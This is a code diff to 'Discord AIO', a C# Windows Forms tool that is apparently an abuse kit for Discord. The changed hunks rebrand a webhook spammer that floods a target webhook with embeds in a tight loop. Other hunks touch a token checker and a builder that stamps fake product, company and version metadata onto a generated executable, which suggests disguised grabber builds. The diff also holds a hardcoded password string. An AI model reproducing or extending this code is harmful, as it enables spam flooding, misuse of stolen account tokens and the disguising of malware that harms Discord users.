@@ -27,7 +27,7 @@ namespace discordAIO
     public partial class main : Form
     {
 
-        private string version = "v0.3.2";
+        private string version = "v0.3.3";
         private protected string email = "fmediolanek@gmail.com";
         private protected static string dAIOPass = "ceDUsRGbwAdcjUqHWkMLgARDrkx4hNJ28WbS6fPjr7cYQ87BKJTRFcUKRbJMMxeWDTEy3k9jsLSVFFV9heDeuWYfECHDzpmgYrttCMuLZRBtuPzuSJ846YBZhCa88Qj2fAaNJuuw6fhZBZfANEbRkXvaupN8rtDQVqrvLKnKW5ESAueQ2pz4QJnTdkDdM3rapFk9mU5DNP9MGAX8zymZW2MxLfj5C4p7PkPRYBxbTyawuQR9uaJZCr4bsSDhnCh2XT5CSUzHBFcVgWS7W5W9Z7SkUe4ehtymPawpwg58mpnN36sgWVSGeFXVzbQcXjfqjcUFcR8T2gBc6Ajm9wMjhCMgMNbmCMBjHKhcLghkeGWhw5wHWNZXhnDDFxnA8U4SzqdMkfTZCeaqTBaTASzKsRmGzeBGpdA9CHkLLxtJfxwj9LQ4vafzercmLJWPWGjpyeuM7CyN7ZgRbP9J6w4wzT3bxdtQXtm8RPVq5AKA6y66pSt5rdBaGbZxUjAHD2se";
 
@@ -333,6 +333,8 @@ namespace discordAIO
                 string SPAMwebhook = textBox1.Text;
                 string SPAMname = textBox3.Text;
                 string SPAMmessage = textBox4.Text;
+                string embedColor = pictureBox4.BackColor.ToArgb().ToString();
+                embedColor = embedColor.Remove(0, 1);
 
                 webhookSwitch = true;
 
@@ -347,7 +349,7 @@ namespace discordAIO
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                     Thread.Sleep(2000);
                                 }
                             }
@@ -374,7 +376,7 @@ namespace discordAIO
                             {
                                 using (HttpRequest req = new HttpRequest())
                                 {
-                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"Discord AIO bitcheeeeesss!\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"3330898\",\"footer\":{\"text\":\"Discord AIO\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://i.imgur.com/BDfuGjz.jpg\",\"url\":\"https://discord.gg/YXa2BF8Q3H\"}}]}", "application/json").ToString();
+                                    string request = req.Post(SPAMwebhook, "{\"username\":\"" + SPAMname + "\",\"embeds\":[{\"title\":\"ɴᴜʟʟ ᴄᴏᴍᴍᴜɴɪᴛʏ\",\"description\":\"" + SPAMmessage + "\",\"type\":\"rich\",\"color\":\"" + embedColor + "\",\"footer\":{\"text\":\"github.com/Nyxonn\"},\"author\":{\"name\":\"Discord AIO\",\"icon_url\":\"https://user-images.githubusercontent.com/45857590/138568746-1a5578fe-f51b-4114-bcf2-e374535f8488.png\",\"url\":\"https://discord.gg/qjrDprutvg\"}}]}", "application/json").ToString();
                                     Thread.Sleep(35);
                                 }
                             }
@@ -445,7 +447,6 @@ namespace discordAIO
             } else
             {
                 string token = textBox5.Text;
-
                 try
                 {
 
@@ -499,9 +500,8 @@ namespace discordAIO
                         pictureBox2.Image = Bitmap.FromStream(stream);
                     }
                 }
-                catch (Exception ex)
+                catch
                 {
-                    MessageBox.Show(ex.ToString());
                     MessageBox.Show("Invalid token.", "Discord AIO");
                 }
 
@@ -788,10 +788,21 @@ namespace discordAIO
                 {
                     label24.Text = mDescription;
                 }
+
+                Title = mTitle;
+                Description = mDescription;
+                Product = mProduct;
+                Company = mCompany;
+                Copyright = mCopyright;
+                Trademark = mTrademark;
+                MajorVersion = mMajorVersion;
+                MinorVersion = mMinorVersion;
+                BuildPart = mBuildPart;
+                PrivatePart = mPrivatePart;
             }
-            catch (Exception ex)
+            catch
             {
-                MessageBox.Show(ex.ToString());
+                MessageBox.Show("Something went wrong.", "Discord AIO");
             }
         }
 
@@ -810,9 +821,9 @@ namespace discordAIO
                     label33.Text = icOpen.FileName;
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                MessageBox.Show(ex.ToString());
+                MessageBox.Show("Something went wrong.", "Discord AIO");
             }
         }
 
@@ -874,6 +885,8 @@ namespace discordAIO
                         string encryptedText = Encrypt(creText);
                         creText = creText.Replace(creText, encryptedText);
                         File.WriteAllText(open.FileName, creText);
+
+                        MessageBox.Show(decryptedText);
 
                         if (decryptedText.Contains("# Windows"))
                         {
@@ -1008,9 +1021,8 @@ namespace discordAIO
                     }
                 }
             }
-            catch (Exception ex)
+            catch
             {
-                MessageBox.Show(ex.ToString());
             }
         }
 
